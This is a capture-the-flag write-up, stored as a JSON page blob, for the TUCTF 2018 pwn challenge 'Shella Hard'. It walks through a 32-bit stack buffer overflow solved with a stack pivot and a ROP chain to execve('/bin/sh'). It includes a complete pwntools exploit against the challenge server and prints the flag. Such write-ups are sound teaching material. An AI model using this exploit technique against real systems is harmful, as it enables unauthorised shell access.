{"pageContext":{"html":"<p><a href=\"ctf=tu-ctf-2018\"></a>\n<a href=\"type=pwn\"></a>\n<a href=\"tags=stack-pivot,buffer-overflow,rop\"></a>\n<a href=\"tools=radare2,gdb-peda,pwntools,python\"></a></p>\n<h1>Shella Hard</h1>\n<p>We are given a <a href=\"/shella-hard-f6f23c1c36cd19a80b6c51b30f601fed.\">binary</a> with <code>NX</code> enabled and a stack based buffer overflow.</p>\n<p><code>bash vagrant@amy:~/share/shella_hard$ file shella-hard shella-hard: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=4bf12a273afc940e93699d77a19496b781e88246, not stripped</code></p>\n<p><code>bash gdb-peda$ checksec CANARY : disabled FORTIFY : disabled NX : ENABLED PIE : disabled RELRO : Partial</code></p>\n<p>The binary has <code>execve</code> in the binary's GOT which allows us to easily create a ROP chain to get a shell.</p>\n<p>`<code></code>bash\nvagrant@amy:~/share/shella_hard$ objdump -R shella-hard</p>\n<p>shella-hard:     file format elf32-i386</p>\n<p>DYNAMIC RELOCATION RECORDS\nOFFSET   TYPE              VALUE\n08049ffc R<em>386</em>GLOB_DAT    <strong>gmon_start</strong>\n0804a00c R<em>386</em>JUMP<em>SLOT   read@GLIBC</em>2.0\n0804a010 R<em>386</em>JUMP_SLOT   _<em>libc</em>start<em>main@GLIBC</em>2.0\n0804a014 R<em>386</em>JUMP<em>SLOT   execve@GLIBC</em>2.0\n`<code></code></p>\n<p>The initial read is too small for a ROP chain and therefore we have to retun to <code>read</code> and write our ROP chain using a stack pivot. Any 'rw-' section of the binary can be used for storing the ROP chain.</p>\n<p>`<code></code>python\nfrom pwn import *</p>\n<p>context(arch='i386', os='linux')</p>\n<h1>p = process('./shella-hard')</h1>\n<p>p = remote('3.16.169.157', 12345)</p>\n<p>execve = 0x08048320\ncmd = 0x8048500 # /bin/sh\nstack = 0x0804a000 + 600 # rw- + stack space. it's</p>\n<h1>crashing in ld.so for some reason if stack space is small</h1>\n<p>read_main = 0x08048443 # lea eax, ebp-0x10</p>\n<p>payload = ''\npayload += 'a' * 0x10\npayload += p32(stack) # overwrites ebp\npayload += p32(read_main)\npayload += p32(100)</p>\n<p>p.sendline(payload)</p>\n<p>payload = ''\npayload += 'a' * 0x10\npayload += 'a' * 4\npayload += p32(execve)\npayload += 'a' * 4\npayload += p32(cmd)\npayload += p32(0x0)\npayload += p32(0x0)</p>\n<p>p.sendline(payload)\np.interactive()\n`<code></code></p>\n<p>Flag</p>\n<blockquote>\n<p>TUCTF{175<em>wh475</em>1n51d3<em>7h47</em>c0un75}</p>\n</blockquote>","relativePath":"writeups/tu-ctf-2018/pwn/shella-hard/jaiverma"}}